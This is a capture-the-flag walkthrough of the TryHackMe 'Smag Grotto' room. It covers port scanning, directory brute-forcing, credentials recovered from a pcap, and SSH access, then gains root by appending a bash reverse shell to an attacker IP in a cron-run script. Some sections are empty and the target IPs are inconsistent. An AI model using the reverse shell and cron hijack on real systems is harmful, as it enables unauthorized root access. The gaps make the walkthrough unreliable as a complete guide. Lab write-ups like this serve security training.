# Smag Grotto

<div align="left">

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Smag Grotto](https://tryhackme.com/room/smaggrotto)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.137.60`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.71.2 smag.thm" >> /etc/hosts

mkdir thm/smag.thm
cd thm/smag.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 smag.thm
PING smag.thm (10.10.71.2) 56(84) bytes of data.
64 bytes from smag.thm (10.10.71.2): icmp_seq=2 ttl=63 time=97.3 ms
64 bytes from smag.thm (10.10.71.2): icmp_seq=3 ttl=63 time=68.6 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

### 2.1 - What is the secret spicy soup recipe?

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 smag.thm -oG nmap/port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 18:24 EDT
Initiating SYN Stealth Scan at 18:24
Scanning smag.thm (10.10.71.2) [65536 ports]
Discovered open port 80/tcp on 10.10.71.2
Discovered open port 22/tcp on 10.10.71.2
Completed SYN Stealth Scan at 18:24, 18.21s elapsed (65536 total ports)
Nmap scan report for smag.thm (10.10.71.2)
Host is up, received user-set (1.8s latency).
Scanned at 2023-07-31 18:24:20 EDT for 19s
Not shown: 59890 closed tcp ports (reset), 5644 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 2 open ports on the machine: 22, 80.

Now, we need to search which services are running on open ports:

```bash
nmap -p22,80 -n -Pn -vvv -sCV --min-rate 5000 smag.thm -oN nmap/open_port
```

We can start to explore website (80):

<figure><img src="../.gitbook/assets/Schermata del 2023-08-01 00-31-11 (1).png" alt=""><figcaption></figcaption></figure>

we see that website is under development, it means that can be vulnerabilities, try to explore source code:

<figure><img src="../.gitbook/assets/Schermata del 2023-08-01 00-31-37.png" alt=""><figcaption></figcaption></figure>

Nothing of interesting! We can try to use gobuster to search hidden paths:

```bash
gobuster dir -u http://smag.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://smag.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/31 18:35:16 Starting gobuster in directory enumeration mode
===============================================================
/mail                 (Status: 301) [Size: 303] [--> http://smag.thm/mail/]
Progress: 87664 / 87665 (100.00%)
===============================================================
2023/07/31 18:45:07 Finished
===============================================================
```

We find 'only' this good path: http:\\\smag.thm/mail

<figure><img src="../.gitbook/assets/Schermata del 2023-08-01 00-38-33.png" alt=""><figcaption><p><a href="https://http/smag.thm/mail">http:\\smag.thm/mail</a></p></figcaption></figure>

Give focus on this .pcap file (wireshark extension), how first paragraph suggests, we can download all attachments using wget command.

<figure><img src="../.gitbook/assets/Schermata del 2023-08-01 00-39-26.png" alt=""><figcaption></figcaption></figure>

We can open file downloaded using wireshark or command strings:

```
strings dHJhY2Uy.pcap 
```

<div align="left">

<figure><img src="../.gitbook/assets/Schermata del 2023-08-01 00-49-23.png" alt=""><figcaption></figcaption></figure>

</div>

There's a fantastic info: username=helpdesk\&password=cH4nG3M3\_n0w

We can use this credentials to try ssh access:

```bash
ssh helpdesk@smag.thm
```





### Task 3 - What is the user flag? 

\


We quickly try to find user.txt flag using find command:\


```bash
```







```bash
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>



</details>

### Task 4 - What is the root flag? 



We can continue to explore files:

```bash
ls -lah *
    -rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
    
    Documents:
    total 20K
    drwxr-xr-x 2 lennie lennie 4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rw-r--r-- 1 root   root    139 Nov 12  2020 concern.txt
    -rw-r--r-- 1 root   root     47 Nov 12  2020 list.txt
    -rw-r--r-- 1 root   root    101 Nov 12  2020 note.txt
    
    scripts:
    total 16K
    drwxr-xr-x 2 root   root   4.0K Nov 12  2020 .
    drwx------ 5 lennie lennie 4.0K May 15 13:37 ..
    -rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
    -rw-r--r-- 1 root   root      1 May 15 13:38 startup_list.txt

cat scripts/*
cat Documents/*
cat /etc/print.sh
ls -lah /etc/print.sh
	-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

We see that planner.sh will be run as root (with a cron job), and use /etc/print.sh with lennie permission, we can modify it inserting a reverse shell as payload:

```bash
echo "/bin/bash -i >& /dev/tcp/10.9.80.228/666 0>&1" >> /etc/print.sh                                                     
```

Then, we run on our kali machine netcat on the same port (666):

```bash
nc -nvlp 666
```

and wait root that will run the planner.sh script once a minute.

<figure><img src="../.gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>

Well done! We find root flag:

```bash
ls
cat root.txt
```

<div align="left">

<figure><img src="../.gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>

</div>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>



</details>
